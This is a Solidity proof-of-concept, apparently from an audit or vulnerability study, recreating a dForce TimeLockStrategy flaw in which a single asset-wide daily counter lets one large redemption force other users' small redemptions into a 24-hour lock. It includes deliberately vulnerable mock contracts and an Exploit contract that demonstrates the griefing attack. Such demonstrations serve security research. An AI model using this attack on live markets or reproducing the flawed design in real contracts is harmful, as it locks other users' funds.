// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// dForce TimeLockStrategy adds every outgoing amount into one asset-wide daily total (MixBytes).
/// Attacker redeems 1000. Victim's later 10, under the single-transfer minimum, waits 86400 seconds.

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract User {
    function approveToken(Asset token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

contract TimeLockStrategy {
    struct AssetLimitConfig {
        uint256 minSingleLimit;
        uint256 midSingleLimit;
        uint256 minDailyLimit;
        uint256 midDailyLimit;
    }

    struct AssetData {
        uint256 currentDailyAmount;
        uint256 dailyStartTime;
    }

    address public controller;
    uint256 public minDailyWaitSeconds;
    uint256 public midDailyWaitSeconds;
    uint256 public maxDailyWaitSeconds;
    mapping(address => AssetLimitConfig) public assetLimitConfig;
    mapping(address => AssetData) public assetData;

    constructor() {
        minDailyWaitSeconds = 0;
        midDailyWaitSeconds = 3600;
        maxDailyWaitSeconds = 86400;
    }

    function setController(address c) external {
        controller = c;
    }

    function setLimits(address asset, uint256 minSingle, uint256 midSingle, uint256 minDaily, uint256 midDaily)
        external
    {
        assetLimitConfig[asset] = AssetLimitConfig(minSingle, midSingle, minDaily, midDaily);
    }

    function calculateTimeLockParams(address asset, uint256 amount, address) external returns (uint256 delay) {
        require(msg.sender == controller, "controller");
        // @> VULN: currentDailyAmount is global, so this caller raises the delay tier for everyone else
        AssetData storage data = assetData[asset];
        uint256 next = data.currentDailyAmount + amount;
        data.currentDailyAmount = next;
        delay = _delay(asset, amount, next);
    }

    function _delay(address asset, uint256 amount, uint256 daily) internal view returns (uint256) {
        AssetLimitConfig memory c = assetLimitConfig[asset];
        if (amount <= c.minSingleLimit && daily <= c.minDailyLimit) return minDailyWaitSeconds;
        if (amount <= c.midSingleLimit && daily <= c.midDailyLimit) return midDailyWaitSeconds;
        return maxDailyWaitSeconds;
    }
}

contract Market {
    TimeLockStrategy public strategy;
    Asset public token;
    mapping(address => uint256) public pending;
    mapping(address => uint256) public readyAt;

    constructor(TimeLockStrategy s, Asset t) {
        strategy = s;
        token = t;
    }

    function redeem(address user, uint256 amount) external returns (uint256 delay) {
        delay = strategy.calculateTimeLockParams(address(token), amount, user);
        token.transferFrom(user, address(this), amount);
        if (delay == 0) {
            token.transfer(user, amount);
        } else {
            pending[user] += amount;
            readyAt[user] = block.timestamp + delay;
        }
    }

    function claim(address user) external {
        require(readyAt[user] != 0 && block.timestamp >= readyAt[user], "locked");
        uint256 amount = pending[user];
        pending[user] = 0;
        token.transfer(user, amount);
    }
}

contract Exploit {
    Asset public token;
    TimeLockStrategy public strategy;
    Market public market;
    User public attacker;
    User public victim;
    uint256 public attackerDelay;
    uint256 public victimDelay;
    uint256 public victimLocked;
    bool public claimReverted;

    constructor() {
        token = new Asset();
        strategy = new TimeLockStrategy();
        market = new Market(strategy, token);
        strategy.setController(address(market));
        strategy.setLimits(address(token), 100 ether, 1000 ether, 100 ether, 1000 ether);
        attacker = new User();
        victim = new User();
        token.mint(address(attacker), 1000 ether);
        token.mint(address(victim), 10 ether);
        attacker.approveToken(token, address(market));
        victim.approveToken(token, address(market));
    }

    function run() external {
        attackerDelay = market.redeem(address(attacker), 1000 ether);
        victimDelay = market.redeem(address(victim), 10 ether);
        victimLocked = market.pending(address(victim));
        (bool ok,) = address(market).call(abi.encodeWithSelector(market.claim.selector, address(victim)));
        claimReverted = !ok;
        (uint256 daily,) = strategy.assetData(address(token));
        require(attackerDelay == 3600, "attacker delay");
        require(victimDelay == 86400, "victim delay");
        require(daily == 1010 ether, "daily");
        require(victimLocked == 10 ether, "locked");
        require(claimReverted, "claimed");
        require(token.balanceOf(address(market)) == 1010 ether, "escrow");
    }

    function runControl() external {
        uint256 before = token.balanceOf(address(victim));
        uint256 delay = market.redeem(address(victim), 10 ether);
        require(delay == 0, "instant");
        require(token.balanceOf(address(victim)) == before, "returned");
        require(market.pending(address(victim)) == 0, "not locked");
    }
}
